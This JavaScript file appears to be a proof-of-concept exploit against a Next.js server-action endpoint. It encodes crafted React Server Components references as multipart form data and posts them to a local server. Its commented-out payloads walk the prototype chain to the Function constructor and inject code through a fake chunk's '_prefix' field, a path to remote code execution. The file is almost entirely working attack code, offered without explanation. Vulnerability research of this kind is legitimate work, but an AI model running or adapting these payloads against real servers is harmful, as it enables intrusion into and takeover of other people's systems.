import FormDataLib from 'form-data';

// const payload = {
//     '0': { then: '$1:__proto__:toString' },
//     //'0': {then: "$1:__proto__:constructor:constructor"},
//     '1': { 'x': '1' }
// }

// const payload = {
//    '0': ["$1"],
//    '1': "Hello, World"
// }

const payload = {
    '0': ['$1'],
    '1': {
        'id': 1,
        'name': '$2:config:name'
    },
    '2': {
        'config': {
            'name': 'Hi there!'
        }
    }
}

// let payload = {
//     '0': '$1',
//     '1': {
//         'status':'resolved_model',
//         'reason':0,
//         '_response':'$4',
//         'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
//         'then':'$2:then'
//     },
//     '2': '$@3',
//     '3': [],
//     '4': {
//         '_prefix':`console.log('hi')//`,
//         '_formData':{
//             'get':'$3:constructor:constructor'
//         },
//         '_chunks':'$2:_response:_chunks',
//     }
// }


const fd = new FormDataLib()

for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]))
}

console.log(fd.getBuffer().toString())

console.log(fd.getHeaders())

async function exploit(baseUrl) {
    const response = await fetch(baseUrl, {
        method: 'POST',
        headers: {
            'next-action': '40dd959a9ef43aa437aead0432f012903b75a3f380',
            // 'next-action': 'x',
            ...fd.getHeaders()
        },
        body: fd.getBuffer()
    });
    const text = await response.text();
    console.log(text);
}

exploit('http://localhost:3000/')